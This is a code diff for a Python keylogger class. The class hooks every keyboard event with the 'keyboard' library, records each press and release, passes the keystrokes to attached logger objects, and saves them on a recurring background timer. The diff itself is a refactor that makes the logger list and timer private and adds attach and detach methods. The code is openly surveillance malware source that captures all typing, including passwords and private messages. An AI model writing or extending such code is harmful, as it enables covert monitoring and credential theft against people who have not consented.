@@ -8,25 +8,31 @@ import keylogger_logger
 
 class Keylogger:
     def __init__(self):
-        self.loggers = []
-        self.timer = None
+        self.__loggers = []
+        self.__timer = None
 
         # log each key pressed
         keyboard.hook(callback=self._on_event)
         
-    def add_logger(self, logger: keylogger_logger._AbstractLogger):
-        self.loggers.append(logger)
+    def attach_logger(self, logger: keylogger_logger._AbstractLogger):
+        self.__loggers.append(logger)
+        logger.on_attached()
+        return self
+
+    def detach_logger(self, logger: keylogger_logger._AbstractLogger):
+        self.__loggers.remove(logger)
+        logger.on_detached()
         return self
 
     def save_each(self, seconds: int):
         # save each attached logger
-        for logger in self.loggers:
+        for logger in self.__loggers:
             logger.save()
 
         # call this function again in `seconds` seconds
-        self.timer = threading.Timer(interval=seconds, function=self.save_each, args=[[seconds]])
-        self.timer.daemon = True     # set the thread as daemon (dies when main thread dies)
-        self.timer.start()
+        self.__timer = threading.Timer(interval=seconds, function=self.save_each, args=[[seconds]])
+        self.__timer.daemon = True     # set the thread as daemon (dies when main thread dies)
+        self.__timer.start()
 
         return self
     
@@ -41,10 +47,10 @@ class Keylogger:
             self.stop()
 
     def stop(self, *_):
-        if self.timer:
-            self.timer.cancel()
+        if self.__timer:
+            self.__timer.cancel()
 
-        for logger in self.loggers:
+        for logger in self.__loggers:
             logger.close()
 
     def _on_event(self, event: keyboard.KeyboardEvent):
@@ -86,11 +92,11 @@ class Keylogger:
         self.log_key('[{}-RELEASE]'.format(name.replace(' ', '_').upper()))
 
     def log_key(self, text: str):
-        for logger in self.loggers:
+        for logger in self.__loggers:
             logger.log(text)
 
     def log_object(self, o):
-        for logger in self.loggers:
+        for logger in self.__loggers:
             logger.log('\n----- Object start -----\n')
             logger.log(str(o))
             logger.log('\n----- Object end -----\n')
